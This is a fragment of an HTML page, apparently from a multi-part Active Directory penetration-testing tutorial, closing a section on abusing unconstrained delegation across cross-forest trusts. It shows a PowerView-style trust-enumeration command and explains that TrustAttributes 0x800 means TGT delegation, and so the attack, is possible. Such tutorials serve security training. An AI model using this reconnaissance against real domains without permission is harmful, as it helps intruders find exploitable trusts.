+<p>This way we were able to abuse the inter-realm Trust by abusing <strong>Unconstrained Delegation.</strong></p>
+<p>We should also check the inter-realm trust attributes.</p>
+<p><code>Get-NetForestTrust | Select-Object SourceName, TargetName, TrustAttributes</code></p>
+<img src="./images/screenshot_354.png" alt="image">
+<ul>
+<li>If <code>TrustAttributes</code> contains <strong>0x800</strong>, then <strong>TGT Delegation</strong> is enabled.</li>
+<li>If it is absent, then it is <strong>not enabled</strong>, and the attack is not possible.</li>
+</ul>
+          <div class="part-navigation">
+            <a href="part-27-cross-forest-attacks---constrained-.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks</a>
+            <a href="part-29-cross-forest-attacks---trust-key-ab.html">Next: Cross Forest Attacks <ion-icon name="arrow-forward-outline"></ion-icon></a>
+          </div>
+        </div>
+      </article>
+    </div>
+  </main>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+  <script src="../assets/js/script.js"></script>
+</body>
+</html>
